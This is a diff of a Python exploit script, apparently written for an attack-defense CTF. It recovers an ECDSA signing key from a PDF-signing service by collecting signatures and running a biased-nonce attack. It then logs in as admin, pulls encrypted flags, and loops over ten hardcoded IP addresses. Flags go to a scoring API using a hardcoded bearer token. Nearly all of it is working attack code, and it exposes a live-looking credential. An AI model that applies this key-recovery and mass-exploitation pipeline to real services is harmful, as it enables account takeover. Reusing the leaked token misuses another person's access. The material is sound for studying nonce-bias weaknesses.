@@ -16,18 +16,15 @@ from ecdsa import NIST256p
 curve = NIST256p
 order = int(curve.order)
 
-# url = 'http://localhost:5111'
-url = 'http://13.250.57.255:11000'
-
 # checking Login
-def login(userData):
+def login(userData, url):
     sess = requests.Session()
     r = sess.post(url+'/login', data=userData, timeout=5)
     assert 'Welcome to'.lower() in r.text.lower()
     return sess
 
 # sending pdf
-def sendPdf(session, pdfbytes):
+def sendPdf(session, pdfbytes, url):
     sendata = ('main.pdf', pdfbytes, 'application/pdf')
     filedata = {'file': sendata}
     r = session.post(url+'/sign', files=filedata, timeout=5)
@@ -35,7 +32,7 @@ def sendPdf(session, pdfbytes):
     signed_pdf_stream = io.BytesIO(signed_pdf)
     return signed_pdf_stream
 
-def getFlag(session, private):
+def getFlag(session, private, url):
     r = session.get(url+'/admin_panel', timeout=5)
     enc_flag = r.text.split("encrypted flag: ")[1].split("</p>")[0]
     return decryptMessage(enc_flag, private)
@@ -68,13 +65,13 @@ def extractPdf(pdfbytes):
     return pdf_content,signature
 
 # make an dataset signature
-def createDataset(session, inc):
+def createDataset(session, inc, url):
     ecdsa = DECDSA("ababab")
     dataset = []
     for i in range(inc):
         temp = str(random.getrandbits(512))
         pdfbytes = create_pdf_bytes(temp)
-        signedData = sendPdf(session, pdfbytes)
+        signedData = sendPdf(session, pdfbytes, url)
         content, sign = extractPdf(signedData)
         r1, r2, s = ecdsa.bytes_to_sign(sign)
         message = content
@@ -106,17 +103,62 @@ def biasedNonce(dataset, inc):
             key = Zn(line[1]*p/B)
             return order-key
 
-def main():
-    userData = {'username': "user", "password": "user"}
-    session = login(userData)
-    inc = 80
-    dataset = createDataset(session, inc)
-    print("success generate dataset:",len(dataset))
-    private = hex(int(biasedNonce(dataset, inc)))[2:]
-    adminData = {'username': "admin", "password": private}
-    session = login(adminData)
-    flag = getFlag(session, private)
-    print(flag)
+def main(url):
+    try:
+        userData = {'username': "user", "password": "user"}
+        session = login(userData, url)
+        inc = 80
+        dataset = createDataset(session, inc, url)
+        print("success generate dataset:",len(dataset))
+        private = hex(int(biasedNonce(dataset, inc)))[2:]
+        adminData = {'username': "admin", "password": private}
+        session = login(adminData, url)
+        flag = getFlag(session, private, url)
+        return flag, private
+    except:
+        return None, None
 
-main()
+listu = [
+    "http://47.129.153.66:11000",
+    "http://54.255.201.188:11000",
+    "http://47.128.224.208:11000",
+    "http://13.250.57.255:11000",
+    "http://47.129.120.12:11000",
+    "http://52.77.232.211:11000",
+    "http://13.212.110.53:11000",
+    "http://54.254.138.70:11000",
+    "http://54.255.228.54:11000",
+    "http://13.212.239.67:11000"
+]
 
+import json
+
+def submitFlag(flag):
+    url = 'http://159.223.57.92:5000/api/flag'
+    token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyMzgxOTU5NCwianRpIjoiNTVkYzM0MjQtNzFhNy00OTU3LWFhNTItYzQyZTE4NTgzMzAxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6eyJ1c2VybmFtZSI6InNlaGFkIn0sIm5iZiI6MTcyMzgxOTU5NCwiY3NyZiI6IjYxMjVkMWI2LTgwYTgtNDEwOC1hNjgyLTY1ZmMwMzQ5NTcwMSIsImV4cCI6MTcyMzkwNTk5NH0.r6vJbs8uxD46PSO-1tJm-zhmcDq1lk_mWQW7dICQEfU'
+    headers = {
+        'Authorization': f'Bearer {token}',
+        'Content-Type': 'application/json'
+    }
+    data = { 'flag': flag  }
+    response = requests.post(url, headers=headers, data=json.dumps(data))
+    return response.json()
+
+# with open("privss.db","wb") as f:
+#     for url in listu:
+#         flag, private = main(url)
+#         f.write(url.encode()+b";"+private.encode()+b"\n")
+#         print("get url:",url, "flag:" ,flag)
+
+with open("privss.db","rb") as f:
+    privates = f.readlines()
+    for line in privates:
+        try:
+            url = line.decode().strip().split(";")[0]
+            privkey = line.decode().strip().split(";")[1]
+            adminData = {'username': "admin", "password": privkey}
+            session = login(adminData, url)
+            flag = getFlag(session, privkey, url)
+            print("url:",url,submitFlag(flag))
+        except:
+            print("url:",url,"is down")
